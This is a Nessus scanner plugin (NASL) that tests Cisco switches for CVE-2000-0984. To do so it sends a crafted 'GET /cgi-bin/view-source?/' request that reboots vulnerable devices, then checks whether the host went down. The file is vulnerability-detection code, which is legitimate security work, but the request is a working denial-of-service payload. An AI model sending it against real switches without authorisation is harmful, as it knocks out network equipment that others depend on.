#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10682);
 script_bugtraq_id(1838);
 script_cve_id("CVE-2000-0984");
 script_version ("$Revision: 1.16 $");
 
 name["english"] = "CISCO view-source DoS";
 name["francais"] = "CISCO view-source DoS";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It was possible to make the remote switch reboot by requesting :

	GET /cgi-bin/view-source?/
	

An attacker may use this flaw to prevent your network from working
properly.

Solution : see http://www.cisco.com/warp/public/707/httpserverquery-pub.shtml
Risk factor : High";




 script_description(english:desc["english"]);
 
 summary["english"] = "crashes the remote switch";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_KILL_HOST);
 
 
 script_copyright(english:"This script is Copyright (C) 2001 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2001 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("global_settings.inc");

port = get_http_port(default:80);
if ( report_paranoia < 2 ) exit(0);


if(get_port_state(port))
{
 start_denial();
 soc = http_open_socket(port);
 if(soc)
 {
  data = http_get(item:string("/cgi-bin/view-source?/"), port:port);
  send(socket:soc, data:data);
  http_close_socket(soc);
  alive = end_denial();
  if(!alive)
  {
   security_hole(port);
   set_kb_item(name:"Host/dead", value:TRUE);
  }
 }
}
